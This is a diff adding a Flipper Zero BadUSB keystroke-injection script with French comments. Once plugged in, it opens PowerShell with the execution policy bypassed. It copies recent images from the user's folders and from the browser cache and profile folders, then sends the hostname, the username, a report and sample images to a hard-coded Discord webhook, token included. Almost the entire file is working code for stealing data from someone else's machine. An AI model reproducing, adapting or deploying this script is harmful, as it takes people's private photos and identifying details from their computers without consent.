@@ -1,0 +1,361 @@
+REM ================================================================
+REM Flipper Zero BadUSB - Extracteur d'Images avec Webhook Discord
+REM ================================================================
+REM Nom: Extraction avec Webhook Discord
+REM Description: Extraction d'images avec envoi automatique via webhook Discord
+REM Cible: Windows 7/8/10/11 (PowerShell 2.0+)
+REM Auteur: Plume-Paopedia
+REM Version: 2.0
+REM Durée: 5-15 minutes
+REM Privilèges: Utilisateur standard (pas d'admin requis)
+REM Fonctionnalités: Envoi images + logs d'erreurs via Discord
+REM ================================================================
+
+REM Configuration du délai optimisé
+DEFAULT_DELAY 300
+
+REM Ouverture de PowerShell avec privilèges utilisateur
+GUI r
+DELAY 500
+STRING powershell -ExecutionPolicy Bypass
+ENTER
+DELAY 1000
+
+REM Script PowerShell complet avec fonctionnalité webhook
+STRING try {
+ENTER
+DELAY 200
+
+STRING # Configuration webhook Discord
+ENTER
+STRING $webhookUrl = "https://discordapp.com/api/webhooks/1416477793264603249/dxrIG93WCYqELVdSEXtQ7aqioc3MglF1m06Kee476so3zrsRllBg"
+ENTER
+DELAY 200
+
+STRING # Fonction pour envoyer un message Discord
+ENTER
+STRING function Send-DiscordMessage {
+ENTER
+STRING   param([string]$message, [string]$file = $null)
+ENTER
+STRING   try {
+ENTER
+STRING     $payload = @{ content = $message }
+ENTER
+STRING     if ($file -and (Test-Path $file)) {
+ENTER
+STRING       $boundary = [System.Guid]::NewGuid().ToString()
+ENTER
+STRING       $headers = @{ 'Content-Type' = "multipart/form-data; boundary=$boundary" }
+ENTER
+STRING       $fileContent = [System.IO.File]::ReadAllBytes($file)
+ENTER
+STRING       $fileName = [System.IO.Path]::GetFileName($file)
+ENTER
+STRING       $body = "--$boundary`r`n"
+ENTER
+STRING       $body += "Content-Disposition: form-data; name=`"content`"`r`n`r`n$message`r`n"
+ENTER
+STRING       $body += "--$boundary`r`n"
+ENTER
+STRING       $body += "Content-Disposition: form-data; name=`"file`"; filename=`"$fileName`"`r`n"
+ENTER
+STRING       $body += "Content-Type: application/octet-stream`r`n`r`n"
+ENTER
+STRING       $bodyBytes = [System.Text.Encoding]::UTF8.GetBytes($body)
+ENTER
+STRING       $fullBody = $bodyBytes + $fileContent + [System.Text.Encoding]::UTF8.GetBytes("`r`n--$boundary--`r`n")
+ENTER
+STRING       Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $fullBody -Headers $headers
+ENTER
+STRING     } else {
+ENTER
+STRING       Invoke-RestMethod -Uri $webhookUrl -Method Post -Body ($payload | ConvertTo-Json) -ContentType 'application/json'
+ENTER
+STRING     }
+ENTER
+STRING   } catch { Write-Host "Erreur webhook: $_" }
+ENTER
+STRING }
+ENTER
+DELAY 500
+
+STRING # Démarrage de l'extraction
+ENTER
+STRING Write-Host '🚀 Démarrage extraction avec webhook Discord...' -ForegroundColor Green
+ENTER
+STRING Send-DiscordMessage "🔄 **Extraction démarrée** sur $(hostname) à $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')"
+ENTER
+DELAY 300
+
+STRING # Configuration de l'extraction
+ENTER
+STRING $basePath = "$env:USERPROFILE\Desktop\Extraction_Webhook_$(Get-Date -Format 'yyyyMMddHHmmss')"
+ENTER
+STRING New-Item -ItemType Directory -Path $basePath -Force | Out-Null
+ENTER
+STRING Set-Location $basePath
+ENTER
+DELAY 200
+
+STRING $dateLimit = (Get-Date).AddDays(-30)
+ENTER
+STRING $extensions = @('*.jpg','*.jpeg','*.png','*.gif','*.bmp','*.webp','*.ico','*.tiff','*.tif','*.jfif','*.heic')
+ENTER
+STRING $locations = @(
+ENTER
+STRING   '$env:USERPROFILE\Pictures',
+ENTER
+STRING   '$env:USERPROFILE\Desktop', 
+ENTER
+STRING   '$env:USERPROFILE\Documents',
+ENTER
+STRING   '$env:USERPROFILE\Downloads',
+ENTER
+STRING   '$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Cache',
+ENTER
+STRING   '$env:APPDATA\Mozilla\Firefox\Profiles'
+ENTER
+STRING )
+ENTER
+DELAY 300
+
+STRING $count = 0
+ENTER
+STRING $errors = @()
+ENTER
+STRING $extractedFiles = @()
+ENTER
+STRING $totalSize = 0
+ENTER
+DELAY 200
+
+STRING # Processus d'extraction
+ENTER
+STRING foreach ($location in $locations) {
+ENTER
+STRING   if (Test-Path $location) {
+ENTER
+STRING     Write-Host "📂 Scan: $location" -ForegroundColor Yellow
+ENTER
+STRING     foreach ($ext in $extensions) {
+ENTER
+STRING       try {
+ENTER
+STRING         $files = Get-ChildItem -Path $location -Filter $ext -Recurse -ErrorAction SilentlyContinue | Where-Object {
+ENTER
+STRING           $_.LastWriteTime -gt $dateLimit -and $_.Length -lt 25MB -and $_.Length -gt 10KB -and -not $_.PSIsContainer
+ENTER
+STRING         }
+ENTER
+STRING         foreach ($file in $files) {
+ENTER
+STRING           try {
+ENTER
+STRING             $newName = "img_$($file.Directory.Name)_$count" + $file.Extension
+ENTER
+STRING             Copy-Item $file.FullName -Destination ".\$newName" -ErrorAction Stop
+ENTER
+STRING             $extractedFiles += $newName
+ENTER
+STRING             $totalSize += $file.Length
+ENTER
+STRING             $count++
+ENTER
+STRING             if ($count % 25 -eq 0) { 
+ENTER
+STRING               Write-Host "✅ $count images extraites..." -ForegroundColor Cyan
+ENTER
+STRING               Send-DiscordMessage "📊 **Progression**: $count images extraites ($(([math]::Round($totalSize/1MB,1))) MB)"
+ENTER
+STRING             }
+ENTER
+STRING           } catch {
+ENTER
+STRING             $errors += "Erreur copie $($file.FullName): $($_.Exception.Message)"
+ENTER
+STRING           }
+ENTER
+STRING         }
+ENTER
+STRING       } catch {
+ENTER
+STRING         $errors += "Erreur scan $location avec $ext`: $($_.Exception.Message)"
+ENTER
+STRING       }
+ENTER
+STRING     }
+ENTER
+STRING   } else {
+ENTER
+STRING     $errors += "Dossier introuvable: $location"
+ENTER
+STRING   }
+ENTER
+STRING }
+ENTER
+DELAY 500
+
+STRING # Création du rapport
+ENTER
+STRING $reportPath = ".\RAPPORT_WEBHOOK.txt"
+ENTER
+STRING $report = @()
+ENTER
+STRING $report += "════════════════════════════════════════"
+ENTER
+STRING $report += "RAPPORT EXTRACTION AVEC WEBHOOK DISCORD"
+ENTER
+STRING $report += "════════════════════════════════════════"
+ENTER
+STRING $report += "Date: $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')"
+ENTER
+STRING $report += "Machine: $(hostname)"
+ENTER
+STRING $report += "Utilisateur: $env:USERNAME"
+ENTER
+STRING $report += "Images extraites: $count"
+ENTER
+STRING $report += "Taille totale: $([math]::Round($totalSize/1MB,2)) MB"
+ENTER
+STRING $report += "Dossier: $basePath"
+ENTER
+STRING $report += ""
+ENTER
+STRING if ($errors.Count -gt 0) {
+ENTER
+STRING   $report += "ERREURS RENCONTRÉES:"
+ENTER
+STRING   foreach ($error in $errors) { $report += "• $error" }
+ENTER
+STRING }
+ENTER
+STRING $report += ""
+ENTER
+STRING $report += "FICHIERS EXTRAITS:"
+ENTER
+STRING foreach ($file in $extractedFiles) { $report += "• $file" }
+ENTER
+STRING $report | Out-File -FilePath $reportPath -Encoding UTF8
+ENTER
+DELAY 300
+
+STRING # Envoi du rapport final via Discord
+ENTER
+STRING $finalMessage = "🎯 **Extraction terminée!**`n"
+ENTER
+STRING $finalMessage += "📊 **Statistiques:**`n"
+ENTER
+STRING $finalMessage += "• Images extraites: **$count**`n"
+ENTER
+STRING $finalMessage += "• Taille totale: **$([math]::Round($totalSize/1MB,2)) MB**`n"
+ENTER
+STRING $finalMessage += "• Machine: **$(hostname)**`n"
+ENTER
+STRING $finalMessage += "• Utilisateur: **$env:USERNAME**`n"
+ENTER
+STRING if ($errors.Count -gt 0) {
+ENTER
+STRING   $finalMessage += "• ⚠️ Erreurs: **$($errors.Count)**"
+ENTER
+STRING }
+ENTER
+STRING Send-DiscordMessage $finalMessage
+ENTER
+DELAY 300
+
+STRING # Envoi du fichier de rapport
+ENTER
+STRING if (Test-Path $reportPath) {
+ENTER
+STRING   Send-DiscordMessage "📄 **Rapport détaillé ci-joint**" $reportPath
+ENTER
+STRING }
+ENTER
+DELAY 200
+
+STRING # Envoi d'échantillons d'images (max 5)
+ENTER
+STRING if ($count -gt 0) {
+ENTER
+STRING   $sampleCount = [Math]::Min(5, $extractedFiles.Count)
+ENTER
+STRING   Send-DiscordMessage "🖼️ **Échantillon des images extraites** ($sampleCount/$count):"
+ENTER
+STRING   for ($i = 0; $i -lt $sampleCount; $i++) {
+ENTER
+STRING     $sampleFile = $extractedFiles[$i]
+ENTER
+STRING     if ((Get-Item $sampleFile).Length -lt 8MB) {
+ENTER
+STRING       Send-DiscordMessage "Image $($i+1)/$sampleCount" $sampleFile
+ENTER
+STRING       Start-Sleep 2
+ENTER
+STRING     }
+ENTER
+STRING   }
+ENTER
+STRING }
+ENTER
+DELAY 500
+
+STRING # Envoi des erreurs si présentes
+ENTER
+STRING if ($errors.Count -gt 0) {
+ENTER
+STRING   $errorMessage = "⚠️ **Erreurs détectées** ($($errors.Count) erreurs):`n"
+ENTER
+STRING   $errorMessage += "``````"
+ENTER
+STRING   foreach ($error in $errors[0..9]) { $errorMessage += "$error`n" }
+ENTER
+STRING   if ($errors.Count -gt 10) { $errorMessage += "... et $($errors.Count - 10) autres erreurs" }
+ENTER
+STRING   $errorMessage += "``````"
+ENTER
+STRING   Send-DiscordMessage $errorMessage
+ENTER
+STRING }
+ENTER
+DELAY 300
+
+STRING # Message de fin
+ENTER
+STRING Write-Host '✅ Extraction terminée! Vérifiez Discord.' -ForegroundColor Green
+ENTER
+STRING Write-Host "📂 Dossier local: $basePath" -ForegroundColor White
+ENTER
+STRING Write-Host "📊 $count images - $([math]::Round($totalSize/1MB,2)) MB" -ForegroundColor White
+ENTER
+
+STRING } catch {
+ENTER
+STRING   $errorMsg = "❌ **ERREUR CRITIQUE**: $($_.Exception.Message)"
+ENTER
+STRING   try {
+ENTER
+STRING     $webhookUrl = "https://discordapp.com/api/webhooks/1416477793264603249/dxrIG93WCYqELVdSEXtQ7aqioc3MglF1m06Kee476so3zrsRllBg"
+ENTER
+STRING     $payload = @{ content = $errorMsg } | ConvertTo-Json
+ENTER
+STRING     Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $payload -ContentType 'application/json'
+ENTER
+STRING   } catch { }
+ENTER
+STRING   Write-Host $errorMsg -ForegroundColor Red
+ENTER
+STRING }
+ENTER
+DELAY 500
+
+STRING # Ouverture du dossier
+ENTER
+STRING if ($count -gt 0) { explorer . }
+ENTER
+STRING Write-Host "Appuyez sur une touche pour fermer..."
+ENTER
+STRING Read-Host
+ENTER
+STRING exit
+ENTER
